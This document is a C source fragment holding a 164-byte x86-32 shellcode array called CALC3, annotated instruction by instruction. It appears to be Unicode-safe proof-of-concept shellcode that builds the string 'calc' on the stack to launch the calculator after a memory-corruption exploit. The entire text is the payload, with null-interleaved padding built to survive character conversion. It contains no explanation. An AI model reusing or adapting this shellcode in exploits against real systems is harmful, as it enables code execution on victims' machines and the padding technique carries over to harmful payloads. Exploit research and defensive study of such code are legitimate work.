
// Target architecture : X86 32

#define CALC3_SIZE 164

char CALC3[] = {
  /* 0000 */ "\xb0\x00"                 /* mov   al, 0                     */
  /* 0002 */ "\xc8\x00\x01\x00"         /* enter 0x100, 0                  */
  /* 0006 */ "\x55"                     /* push  ebp                       */
  /* 0007 */ "\x00\x45\x00"             /* add   byte ptr [ebp], al        */
  /* 000A */ "\x6a\x00"                 /* push  0                         */
  /* 000C */ "\x54"                     /* push  esp                       */
  /* 000D */ "\x00\x45\x00"             /* add   byte ptr [ebp], al        */
  /* 0010 */ "\x5d"                     /* pop   ebp                       */
  /* 0011 */ "\x00\x4d\x00"             /* add   byte ptr [ebp], cl        */
  /* 0014 */ "\x57"                     /* push  edi                       */
  /* 0015 */ "\x00\x4d\x00"             /* add   byte ptr [ebp], cl        */
  /* 0018 */ "\x56"                     /* push  esi                       */
  /* 0019 */ "\x00\x4d\x00"             /* add   byte ptr [ebp], cl        */
  /* 001C */ "\x53"                     /* push  ebx                       */
  /* 001D */ "\x00\x4d\x00"             /* add   byte ptr [ebp], cl        */
  /* 0020 */ "\xb8\x00\x4d\x00\xff"     /* mov   eax, 0xff004d00           */
  /* 0025 */ "\x00\xe1"                 /* add   cl, ah                    */
  /* 0027 */ "\x00\x4d\x00"             /* add   byte ptr [ebp], cl        */
  /* 002A */ "\xb8\x00\x01\x00\xff"     /* mov   eax, 0xff000100           */
  /* 002F */ "\x00\xe5"                 /* add   ch, ah                    */
  /* 0031 */ "\x00\x4d\x00"             /* add   byte ptr [ebp], cl        */
  /* 0034 */ "\x51"                     /* push  ecx                       */
  /* 0035 */ "\x00\x4d\x00"             /* add   byte ptr [ebp], cl        */
  /* 0038 */ "\x5b"                     /* pop   ebx                       */
  /* 0039 */ "\x00\x4d\x00"             /* add   byte ptr [ebp], cl        */
  /* 003C */ "\x6a\x00"                 /* push  0                         */
  /* 003E */ "\x54"                     /* push  esp                       */
  /* 003F */ "\x00\x4d\x00"             /* add   byte ptr [ebp], cl        */
  /* 0042 */ "\x5f"                     /* pop   edi                       */
  /* 0043 */ "\x00\x4d\x00"             /* add   byte ptr [ebp], cl        */
  /* 0046 */ "\x57"                     /* push  edi                       */
  /* 0047 */ "\x00\x4d\x00"             /* add   byte ptr [ebp], cl        */
  /* 004A */ "\x59"                     /* pop   ecx                       */
  /* 004B */ "\x00\x4d\x00"             /* add   byte ptr [ebp], cl        */
  /* 004E */ "\x6a\x00"                 /* push  0                         */
  /* 0050 */ "\x54"                     /* push  esp                       */
  /* 0051 */ "\x00\x4d\x00"             /* add   byte ptr [ebp], cl        */
  /* 0054 */ "\x58"                     /* pop   eax                       */
  /* 0055 */ "\x00\x4d\x00"             /* add   byte ptr [ebp], cl        */
  /* 0058 */ "\xc7\x00\x63\x00\x6c\x00" /* mov   dword ptr [eax], 0x6c0063 */
  /* 005E */ "\x58"                     /* pop   eax                       */
  /* 005F */ "\x00\x4d\x00"             /* add   byte ptr [ebp], cl        */
  /* 0062 */ "\x35\x00\x61\x00\x63"     /* xor   eax, 0x63006100           */
  /* 0067 */ "\x00\x4d\x00"             /* add   byte ptr [ebp], cl        */
  /* 006A */ "\xab"                     /* stosd dword ptr es:[edi], eax   */
  /* 006B */ "\x00\x4d\x00"             /* add   byte ptr [ebp], cl        */
  /* 006E */ "\x6a\x00"                 /* push  0                         */
  /* 0070 */ "\x54"                     /* push  esp                       */
  /* 0071 */ "\x00\x4d\x00"             /* add   byte ptr [ebp], cl        */
  /* 0074 */ "\x58"                     /* pop   eax                       */
  /* 0075 */ "\x00\x4d\x00"             /* add   byte ptr [ebp], cl        */
  /* 0078 */ "\xc6\x00\x05"             /* mov   byte ptr [eax], 5         */
  /* 007B */ "\x00\x4d\x00"             /* add   byte ptr [ebp], cl        */
  /* 007E */ "\x5a"                     /* pop   edx                       */
  /* 007F */ "\x00\x4d\x00"             /* add   byte ptr [ebp], cl        */
  /* 0082 */ "\x53"                     /* push  ebx                       */
  /* 0083 */ "\x00\x4d\x00"             /* add   byte ptr [ebp], cl        */
  /* 0086 */ "\x6a\x00"                 /* push  0                         */
  /* 0088 */ "\x6a\x00"                 /* push  0                         */
  /* 008A */ "\x6a\x00"                 /* push  0                         */
  /* 008C */ "\x6a\x00"                 /* push  0                         */
  /* 008E */ "\x6a\x00"                 /* push  0                         */
  /* 0090 */ "\x53"                     /* push  ebx                       */
  /* 0091 */ "\x00\x4d\x00"             /* add   byte ptr [ebp], cl        */
  /* 0094 */ "\x90"                     /* nop                             */
  /* 0095 */ "\x00\x4d\x00"             /* add   byte ptr [ebp], cl        */
  /* 0098 */ "\x90"                     /* nop                             */
  /* 0099 */ "\x00\x4d\x00"             /* add   byte ptr [ebp], cl        */
  /* 009C */ "\x90"                     /* nop                             */
  /* 009D */ "\x00\x4d\x00"             /* add   byte ptr [ebp], cl        */
  /* 00A0 */ "\x90"                     /* nop                             */
  /* 00A1 */ "\x00\x4d\x00"             /* add   byte ptr [ebp], cl        */
};
